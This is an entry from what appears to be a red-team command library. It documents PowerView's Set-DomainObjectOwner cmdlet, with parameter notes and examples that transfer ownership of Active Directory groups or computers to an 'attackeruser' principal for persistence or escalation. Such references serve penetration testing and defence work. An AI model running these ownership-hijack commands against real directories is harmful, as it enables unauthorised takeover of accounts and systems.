---
id: f36ec1e1-5f33-468f-baad-f97eab471876
name: powershell-set-domain-object-owner
type: command
executor: powershell
data: >-
  Set-DomainObjectOwner -Identity $_TARGET_OBJECT -OwnerIdentity
  $_OWNER_IDENTITY
output: null
created_at: '2023-04-06T03:56:06.890396+00:00'
updated_at: '2023-04-10T20:26:31.170427+00:00'
platforms:
  - Windows
tags:
  - active-directory
  - persistence
verified: true
validated: true
---

# powershell-set-domain-object-owner

## Command

```powershell
Set-DomainObjectOwner -Identity $_TARGET_OBJECT -OwnerIdentity $_OWNER_IDENTITY
```

## Description

This PowerShell cmdlet from the PowerView module changes the owner of a specified Active Directory object to a new principal, enabling control takeover for persistence or escalation. Use it after confirming WriteOwner permissions.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| -Identity | Distinguished name (DN) or SAM account name of the target object (e.g., 'CN=TargetUser,CN=Users,DC=corp,DC=com') | Yes |
| -OwnerIdentity | SAM account name or DN of the new owner principal (e.g., 'attackeruser') | Yes |

## Examples

### Basic Usage

```powershell
Set-DomainObjectOwner -Identity 'CN=TargetGroup,CN=Users,DC=corp,DC=com' -OwnerIdentity 'attackeruser'
```

### Advanced Usage

```powershell
Set-DomainObjectOwner -Identity 'targetcomputer$' -OwnerIdentity 'CN=Attacker,CN=Users,DC=corp,DC=com' -Server dc01.corp.com
```

## Expected Output

The command typically returns the updated DirectoryEntry object or a success confirmation like "Owner updated." No output on failure beyond error (e.g., AccessDeniedException). Verify with: Get-DomainObjectOwner -Identity $_TARGET_OBJECT.

## Related

- [[procedures/Active-Directory-Object-Owner-Hijacking]]
- [[tools/PowerView]]
